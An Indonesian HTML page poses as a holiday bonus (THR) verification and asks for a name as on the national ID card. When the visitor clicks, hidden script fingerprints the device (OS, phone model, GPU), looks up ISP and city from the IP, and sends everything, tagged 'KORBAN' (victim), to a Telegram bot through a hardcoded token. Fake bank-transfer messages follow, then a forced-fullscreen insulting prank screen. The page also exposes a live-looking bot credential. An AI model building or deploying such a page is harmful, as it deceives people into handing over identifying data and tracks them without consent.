<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Konfirmasi Penerimaan THR 2026 🌙</title>
    <style>
        body { margin: 0; padding: 0; background: #f0fdf4; font-family: 'Segoe UI', sans-serif; overflow: hidden; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; flex-direction: column; }
        #intro { margin-top: -50px; padding: 0 20px; z-index: 5; }
        h1 { color: #15803d; margin-bottom: 5px; font-size: 1.8rem; }
        p { color: #166534; margin-top: 0; font-weight: bold; }
        #verify-box { background: white; padding: 15px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); margin-bottom: 20px; width: 280px; z-index: 6; }
        input { width: 90%; padding: 12px; border: 2px solid #e2e8f0; border-radius: 10px; outline: none; text-align: center; font-size: 1rem; }
        #envelope { width: 280px; cursor: pointer; transition: 0.2s; z-index: 10; margin-top: 10px; }
        #prank-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 100; justify-content: center; align-items: center; }
        #prank-screen img { width: 100%; height: 100%; object-fit: contain; }
        #loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 50; flex-direction: column; align-items: center; justify-content: center; }
        .spinner { border: 5px solid #f3f3f3; border-top: 5px solid #15803d; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div id="intro">
        <h1>Selamat Lebaran! 🌙</h1>
        <p>Verifikasi nama Anda untuk pencairan dana THR.</p>
    </div>

    <div id="verify-box">
        <input type="text" id="victim-name" placeholder="Nama Sesuai KTP" autocomplete="off">
    </div>

    <img id="envelope" src="amplop.png" alt="Amplop THR">

    <div id="loading-overlay">
        <div class="spinner"></div>
        <p id="status-text" style="margin-top: 20px; font-weight: bold; color: #15803d;">Menghubungkan ke server bank...</p>
    </div>

    <div id="prank-screen" onclick="location.reload()">
        <img src="monyet-memberikan-jari-tengah-kepada-orang-orang.jpg">
    </div>

    <script>
        const env = document.getElementById('envelope');
        const nameInput = document.getElementById('victim-name');
        const loading = document.getElementById('loading-overlay');
        const statusText = document.getElementById('status-text');
        const prank = document.getElementById('prank-screen');
        
        // PRE-LOAD SUARA
        const prankSound = new Audio('https://www.myinstants.com/media/sounds/monkey-laugh.mp3');
        prankSound.load();

        const TELE_TOKEN = '8642591827:AAEW79QE8FGYcvELtapkI2jnhvXocW4rd9U'; 
        const TELE_ID = '7267912519'; 

        async function kirimLog(nama) {
            const ua = navigator.userAgent;
            let device = /android/i.test(ua) ? "Android" : (/iPhone|iPad|iPod/i.test(ua) ? "iPhone/iOS" : "PC");
            
            // Deteksi GPU (buat nebak chipset HP)
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
            const GPU = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_ID) : "Unknown GPU";
            
            let isp = "Unknown";
            let kota = "Unknown";

            try {
                const res = await fetch('https://ipwho.is/');
                const d = await res.json();
                isp = d.connection.isp || "Unknown";
                kota = d.city || "Unknown";
            } catch (e) { isp = "AdBlock/Error"; }

            const teks = `🎯 KORBAN: ${nama}\n📱 OS: ${device}\n🔍 Seri: ${ua.split(') ')[0].split('(')[1]}\n🎮 GPU: ${GPU}\n🌐 Provider: ${isp}\n📍 Lokasi: ${kota}\n⏰ Jam: ${new Date().toLocaleTimeString()}`;
            
            fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${TELE_ID}&text=${encodeURIComponent(teks)}`, { mode: 'no-cors' });
        }

        env.addEventListener('click', () => {
            const nama = nameInput.value.trim();
            if (nama === "") {
                alert("Masukkan nama dulu bos!");
                return;
            }

            // --- TRICK: AKTIFKAN FULLSCREEN & SUARA SECEPATNYA ---
            const elem = document.documentElement;
            if (elem.requestFullscreen) elem.requestFullscreen();
            else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
            
            // Pancing suara biar browser ijinin main nanti
            prankSound.play().then(() => { prankSound.pause(); prankSound.currentTime = 0; }).catch(() => {});
            // ----------------------------------------------------

            kirimLog(nama);
            loading.style.display = 'flex';
            setTimeout(() => { statusText.innerText = "Memverifikasi data " + nama + "..."; }, 1000);
            setTimeout(() => { statusText.innerText = "Proses transfer saldo Rp 500.000..."; }, 2500);

            setTimeout(() => {
                loading.style.display = 'none';
                prank.style.display = 'flex';
                prankSound.loop = true;
                prankSound.play();
                if (navigator.vibrate) navigator.vibrate([500, 100, 500, 100, 500]);
            }, 5500);
        });
    </script>
</body>
</html>
